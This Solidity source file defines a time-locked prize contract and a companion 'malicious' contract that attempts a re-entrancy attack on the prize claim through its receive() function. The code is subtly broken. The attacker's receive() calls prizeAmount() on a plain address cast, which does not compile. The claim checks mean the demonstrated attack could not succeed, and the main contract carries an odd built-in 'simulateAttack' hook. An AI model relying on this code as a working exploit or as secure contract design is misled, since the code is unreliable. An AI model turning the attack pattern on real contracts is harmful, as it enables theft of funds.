pragma solidity ^0.7.6;

contract PrizeDistribution {
    address public organizer;
    address public beneficiary;
    uint256 public unlockTime;
    uint256 public prizeAmount;

    constructor(address _beneficiary) payable {
        organizer = msg.sender;
        beneficiary = _beneficiary;
        unlockTime = block.timestamp + 1 days;
        prizeAmount = msg.value; // Initial prize amount set by the organizer
    }

    function extendLockTime(uint256 additionalTime) public payable {
        require(
            msg.sender == organizer,
            "Only the organizer can extend the lock time."
        );
        unlockTime += additionalTime;
        prizeAmount += msg.value;
    }

    function claimPrize() public {
        require(
            msg.sender == beneficiary,
            "Only the beneficiary can claim the prize."
        );
        require(block.timestamp >= unlockTime, "Prize is still locked.");
        uint256 amountToTransfer = prizeAmount;
        prizeAmount = 0; // Prevent re-entrancy by setting the prize amount to zero before transfer
        payable(beneficiary).transfer(amountToTransfer);
    }

    // Utility function to simulate a re-entrant attack by a malicious contract
    function simulateAttack(address maliciousContract) external {
        require(
            msg.sender == organizer,
            "Only the organizer can initiate the attack simulation."
        );
        // This is for demonstration and would not be part of a real contract
        PrizeDistributionAttacker attacker = PrizeDistributionAttacker(
            maliciousContract
        );
        attacker.attack(address(this));
    }
}

// Malicious contract designed to exploit the PrizeDistribution contract
contract PrizeDistributionAttacker {
    function attack(address vulnerableContract) public {
        PrizeDistribution(vulnerableContract).claimPrize();
    }

    // Fallback function to receive ETH
    receive() external payable {
        if (address(PrizeDistribution(msg.sender)).prizeAmount() > 0) {
            PrizeDistribution(msg.sender).claimPrize();
        }
    }
}
